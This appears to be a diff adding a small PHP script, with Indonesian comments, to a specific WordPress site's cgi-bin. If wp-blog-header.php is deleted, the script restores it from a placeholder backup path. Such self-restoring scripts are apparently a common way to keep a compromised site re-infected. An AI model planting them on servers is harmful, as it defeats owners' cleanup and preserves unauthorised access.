@@ -1,0 +1,13 @@
+<?php
+$file = '/home/he109633/aislacastilla.com/wp-blog-header.php';
+$backup = '/path/to/backup/protected_file.php';
+
+// file cek
+if (!file_exists($file)) {
+    // Jika file dihapus, kembalikan dari backup
+    copy($backup, $file);
+    echo "/home/he109633/aislacastilla.com/cgi-bin/backup.php";
+} else {
+    echo "/home/he109633/aislacastilla.com/cgi-bin/backup.php";
+}
+?>
